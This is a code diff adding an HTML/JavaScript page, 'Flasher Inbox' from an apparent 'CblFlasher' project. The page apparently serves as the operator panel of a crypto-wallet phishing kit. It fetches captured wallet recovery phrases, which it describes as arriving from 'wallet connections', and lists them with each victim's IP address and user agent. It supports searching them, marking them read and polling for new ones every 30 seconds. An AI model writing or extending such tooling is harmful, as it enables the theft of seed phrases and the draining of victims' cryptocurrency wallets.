@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inbox - CblFlasher</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="inbox.css">
+</head>
+<body>
+    <!-- Preloader -->
+    <div class="preloader">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Header -->
+    <header class="site-header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-cube"></i>
+                    <h1>Flasher Inbox</h1>
+                </div>
+                <nav class="main-nav">
+
+            </div>
+        </div>
+    </header>
+
+    <div id="inbox-app" class="container">
+        <!-- Inbox content will be loaded here -->
+        <div class="inbox-loading">
+            <div class="spinner"></div>
+            <p>Loading your inbox...</p>
+        </div>
+    </div>
+
+    <!-- Toast Notifications -->
+    <div id="toast-container"></div>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Remove preloader
+        setTimeout(() => {
+            document.querySelector('.preloader').style.display = 'none';
+        }, 500);
+        
+        // Mobile menu toggle
+        const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
+        const mainNav = document.querySelector('.main-nav');
+        
+        if (mobileMenuToggle) {
+            mobileMenuToggle.addEventListener('click', function() {
+                mainNav.classList.toggle('active');
+                this.classList.toggle('active');
+            });
+        }
+
+        // Check if user is logged in
+        const session = JSON.parse(localStorage.getItem('userSession'));
+        if (!session) {
+            window.location.href = 'index.html';
+            return;
+        }
+
+        // Logout button
+        // document.getElementById('logout-btn').addEventListener('click', function() {
+        //     localStorage.removeItem('userSession');
+        //     window.location.href = 'index.html';
+        // });
+
+        // Add refresh button functionality
+        const refreshInboxBtn = document.getElementById('refresh-inbox-btn');
+        if (refreshInboxBtn) {
+            refreshInboxBtn.addEventListener('click', function() {
+                this.disabled = true;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+                loadInbox();
+                setTimeout(() => {
+                    this.disabled = false;
+                    this.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
+                }, 1000);
+            });
+        }
+
+        // Load inbox data
+        loadInbox();
+    });
+
+    function loadInbox() {
+        const session = JSON.parse(localStorage.getItem('userSession'));
+        if (!session || !session.userId) {
+            showError('You must be logged in to view your inbox');
+            return;
+        }
+
+        // Read directly from inboxes.json instead of phrases.json
+        fetch('/api/inbox/' + session.userId)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to fetch inbox data');
+                }
+                return response.json();
+            })
+            .then(data => {
+            // Get only phrases for the current user
+            const userPhrases = data.phrases || [];
+            renderInbox(userPhrases);
+            
+            // Update stats
+            const totalCount = userPhrases.length;
+            const unreadCount = userPhrases.filter(phrase => !phrase.read).length;
+            
+            const totalElement = document.querySelector('.inbox-stats .stat:nth-child(1) .stat-value');
+            const unreadElement = document.querySelector('.inbox-stats .stat:nth-child(2) .stat-value');
+            
+            if (totalElement) totalElement.textContent = totalCount;
+            if (unreadElement) unreadElement.textContent = unreadCount;
+        })
+        .catch(error => {
+            console.error('Error loading inbox:', error);
+            showError('Error loading inbox data. Please try again later.');
+        });
+}
+
+    function renderInbox(phrases) {
+        const inboxApp = document.getElementById('inbox-app');
+        
+        if (phrases.length === 0) {
+            inboxApp.innerHTML = `
+                <div class="inbox-container">
+                    <div class="inbox-header">
+                        <h1>Your Inbox</h1>
+                        <div class="inbox-actions">
+                            <button id="refresh-inbox-btn" class="btn secondary-btn">
+                                <i class="fas fa-sync-alt"></i> Refresh
+                            </button>
+                            <a href="index.html" class="btn secondary-btn">
+                                <i class="fas fa-arrow-left"></i> Back to Dashboard
+                            </a>
+                        </div>
+                        <div class="inbox-stats">
+                            <div class="stat">
+                                <span class="stat-value">0</span>
+                                <span class="stat-label">Total</span>
+                            </div>
+                            <div class="stat">
+                                <span class="stat-value">0</span>
+                                <span class="stat-label">Unread</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="inbox-toolbar">
+                        <div class="search-box">
+                            <input type="text" placeholder="Search phrases..." disabled>
+                            <i class="fas fa-search"></i>
+                        </div>
+                        
+                        <div class="filter-dropdown">
+                            <select disabled>
+                                <option value="all">All Phrases</option>
+                                <option value="unread">Unread Only</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div class="empty-inbox">
+                        <i class="fas fa-inbox"></i>
+                        <p>Your inbox is empty</p>
+                        <p class="empty-subtitle">Phrases from wallet connections will appear here</p>
+                        <a href="index.html" class="btn primary-btn" style="margin-top: 20px;">
+                            <i class="fas fa-arrow-left"></i> Back to Dashboard
+                        </a>
+                    </div>
+                </div>
+            `;
+            
+            // Add refresh button functionality
+            const refreshInboxBtn = document.getElementById('refresh-inbox-btn');
+            if (refreshInboxBtn) {
+                refreshInboxBtn.addEventListener('click', function() {
+                    this.disabled = true;
+                    this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+                    loadInbox();
+                    setTimeout(() => {
+                        this.disabled = false;
+                        this.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
+                    }, 1000);
+                });
+            }
+            
+            return;
+        }
+
+        // Count unread phrases
+        const unreadCount = phrases.filter(phrase => !phrase.read).length;
+        
+        // Sort phrases by timestamp (newest first)
+        phrases.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+        let phrasesList = '';
+        phrases.forEach(phrase => {
+            phrasesList += `
+                <div class="phrase-item ${!phrase.read ? 'unread' : ''}" data-id="${phrase.id}">
+                    <div class="phrase-icon">
+                        <i class="fas fa-wallet"></i>
+                    </div>
+                    <div class="phrase-content">
+                        <div class="phrase-header">
+                            <h3 class="phrase-wallet">${phrase.wallet}</h3>
+                            <span class="phrase-time">${formatDate(phrase.timestamp)}</span>
+                        </div>
+                        <p class="phrase-preview">
+                            ${phrase.phrase.substring(0, 50)}
+                            ${phrase.phrase.length > 50 ? '...' : ''}
+                        </p>
+                    </div>
+                    ${!phrase.read ? '<div class="unread-badge"></div>' : ''}
+                </div>
+            `;
+        });
+
+        inboxApp.innerHTML = `
+            <div class="inbox-container">
+                <div class="inbox-header">
+                    <h1>Your Inbox</h1>
+                    <div class="inbox-actions">
+                        <button id="refresh-inbox-btn" class="btn secondary-btn">
+                            <i class="fas fa-sync-alt"></i> Refresh
+                        </button>
+                        <a href="index.html" class="btn secondary-btn">
+                            <i class="fas fa-arrow-left"></i> Back to Dashboard
+                        </a>
+                    </div>
+                    <div class="inbox-stats">
+                        <div class="stat">
+                            <span class="stat-value">${phrases.length}</span>
+                            <span class="stat-label">Total</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-value">${unreadCount}</span>
+                            <span class="stat-label">Unread</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="inbox-toolbar">
+                    <div class="search-box">
+                        <input type="text" id="search-input" placeholder="Search phrases...">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    
+                    <div class="filter-dropdown">
+                        <select id="filter-select">
+                            <option value="all">All Phrases</option>
+                            <option value="unread">Unread Only</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="phrases-list">
+                    ${phrasesList}
+                </div>
+            </div>
+            
+            <div id="phrase-modal" class="phrase-modal" style="display: none;">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h2 id="modal-wallet">Wallet</h2>
+                        <button class="close-btn" id="close-modal">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="detail-row">
+                            <span class="detail-label">Recovery Phrase:</span>
+                            <span class="detail-value" id="modal-phrase"></span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">Date & Time:</span>
+                            <span class="detail-value" id="modal-time"></span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">IP Address:</span>
+                            <span class="detail-value" id="modal-ip"></span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-label">User Agent:</span>
+                            <span class="detail-value" id="modal-useragent"></span>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button class="btn danger-btn" id="delete-phrase-btn">Delete</button>
+                        <button class="btn secondary-btn" id="close-modal-btn">Close</button>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        // Add event listeners
+        document.querySelectorAll('.phrase-item').forEach(item => {
+            item.addEventListener('click', function() {
+                const phraseId = this.getAttribute('data-id');
+                const phrase = phrases.find(p => p.id === phraseId);
+                if (phrase) {
+                    showPhraseDetails(phrase);
+                    
+                    // Mark as read if not already
+                    if (!phrase.read) {
+                        markAsRead(phraseId);
+                    }
+                }
+            });
+        });
+
+        document.getElementById('search-input').addEventListener('input', function() {
+            filterPhrases();
+        });
+
+        document.getElementById('filter-select').addEventListener('change', function() {
+            filterPhrases();
+        });
+
+        document.getElementById('close-modal').addEventListener('click', function() {
+            document.getElementById('phrase-modal').style.display = 'none';
+        });
+
+        document.getElementById('close-modal-btn').addEventListener('click', function() {
+            document.getElementById('phrase-modal').style.display = 'none';
+        });
+
+        document.getElementById('delete-phrase-btn').addEventListener('click', function() {
+            const phraseId = this.getAttribute('data-phrase-id');
+            if (phraseId) {
+                deletePhrase(phraseId);
+            }
+        });
+        
+        // Add refresh button functionality
+        const refreshInboxBtn = document.getElementById('refresh-inbox-btn');
+        if (refreshInboxBtn) {
+            refreshInboxBtn.addEventListener('click', function() {
+                this.disabled = true;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+                loadInbox();
+                setTimeout(() => {
+                    this.disabled = false;
+                    this.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
+                }, 1000);
+            });
+        }
+
+        // Function to filter phrases based on search and filter
+        function filterPhrases() {
+            const searchTerm = document.getElementById('search-input').value.toLowerCase();
+            const filterValue = document.getElementById('filter-select').value;
+            
+            document.querySelectorAll('.phrase-item').forEach(item => {
+                const phraseId = item.getAttribute('data-id');
+                const phrase = phrases.find(p => p.id === phraseId);
+                
+                if (!phrase) return;
+                
+                let show = true;
+                
+                // Apply filter
+                if (filterValue === 'unread' && phrase.read) {
+                    show = false;
+                }
+                
+                // Apply search
+                if (searchTerm && show) {
+                    const walletMatch = phrase.wallet.toLowerCase().includes(searchTerm);
+                    const phraseMatch = phrase.phrase.toLowerCase().includes(searchTerm);
+                    
+                    if (!walletMatch && !phraseMatch) {
+                        show = false;
+                    }
+                }
+                
+                item.style.display = show ? 'flex' : 'none';
+            });
+        }
+    }
+
+    function showPhraseDetails(phrase) {
+        document.getElementById('modal-wallet').textContent = phrase.wallet + ' Wallet';
+        document.getElementById('modal-phrase').textContent = phrase.phrase;
+        document.getElementById('modal-time').textContent = formatDate(phrase.timestamp);
+        document.getElementById('modal-ip').textContent = phrase.ip || 'Unknown';
+        document.getElementById('modal-useragent').textContent = phrase.userAgent || 'Unknown';
+        
+        document.getElementById('delete-phrase-btn').setAttribute('data-phrase-id', phrase.id);
+        
+        document.getElementById('phrase-modal').style.display = 'flex';
+    }
+
+    function markAsRead(phraseId) {
+        // Since we're reading directly from phrases.json, we'll just update the UI
+        // In a real app, you would make an API call to update the server
+        
+        // Update UI
+        const phraseItem = document.querySelector(`.phrase-item[data-id="${phraseId}"]`);
+        if (phraseItem) {
+            phraseItem.classList.remove('unread');
+            const badge = phraseItem.querySelector('.unread-badge');
+            if (badge) {
+                badge.remove();
+            }
+        }
+        
+        // Update unread count
+        const unreadCountElement = document.querySelector('.inbox-stats .stat:nth-child(2) .stat-value');
+        if (unreadCountElement) {
+            const currentCount = parseInt(unreadCountElement.textContent);
+            unreadCountElement.textContent = Math.max(0, currentCount - 1);
+        }
+    }
+
+    function deletePhrase(phraseId) {
+        if (!confirm('Are you sure you want to delete this phrase?')) return;
+        
+        // Since we're reading directly from phrases.json, we'll just update the UI
+        // In a real app, you would make an API call to update the server
+        
+        // Close modal
+        document.getElementById('phrase-modal').style.display = 'none';
+        
+        // Remove phrase from list
+        const phraseItem = document.querySelector(`.phrase-item[data-id="${phraseId}"]`);
+        if (phraseItem) {
+            // Check if it was unread
+            const wasUnread = phraseItem.classList.contains('unread');
+            
+            // Remove from DOM
+            phraseItem.remove();
+            
+            // Update stats
+            const totalCountElement = document.querySelector('.inbox-stats .stat:nth-child(1) .stat-value');
+            if (totalCountElement) {
+                const currentCount = parseInt(totalCountElement.textContent);
+                totalCountElement.textContent = Math.max(0, currentCount - 1);
+            }
+            
+            if (wasUnread) {
+                const unreadCountElement = document.querySelector('.inbox-stats .stat:nth-child(2) .stat-value');
+                if (unreadCountElement) {
+                    const currentCount = parseInt(unreadCountElement.textContent);
+                    unreadCountElement.textContent = Math.max(0, currentCount - 1);
+                }
+            }
+            
+            // Check if list is now empty
+            const phrasesList = document.querySelector('.phrases-list');
+            if (phrasesList && phrasesList.children.length === 0) {
+                loadInbox(); // Reload to show empty state
+            }
+        }
+        
+        showToast('Phrase deleted successfully', 'success');
+    }
+
+    function formatDate(dateString) {
+        const date = new Date(dateString);
+        return date.toLocaleString();
+    }
+
+    function showError(message) {
+        const inboxApp = document.getElementById('inbox-app');
+        inboxApp.innerHTML = `
+            <div class="inbox-error">
+                <div class="error-icon">⚠️</div>
+                <h2>Error</h2>
+                <p>${message}</p>
+                <button class="btn primary-btn" onclick="window.location.href='index.html'">
+                    Back to Dashboard
+                </button>
+            </div>
+        `;
+    }
+
+    function showToast(message, type = 'info') {
+        const toastContainer = document.getElementById('toast-container');
+        const toast = document.createElement('div');
+        toast.className = `toast toast-${type}`;
+
+        let icon;
+        switch (type) {
+            case 'success':
+                icon = 'fa-check-circle';
+                break;
+            case 'error':
+                icon = 'fa-exclamation-circle';
+                break;
+            default:
+                icon = 'fa-info-circle';
+        }
+
+        toast.innerHTML = `
+            <div class="toast-icon">
+                <i class="fas ${icon}"></i>
+            </div>
+            <div class="toast-message">${message}</div>
+        `;
+
+        toastContainer.appendChild(toast);
+
+        // Remove toast after animation completes
+        setTimeout(() => {
+            toast.remove();
+        }, 3000);
+    }
+
+    // Poll for new phrases every 30 seconds
+    setInterval(loadInbox, 30000);
+</script>
+</body>
+</html>
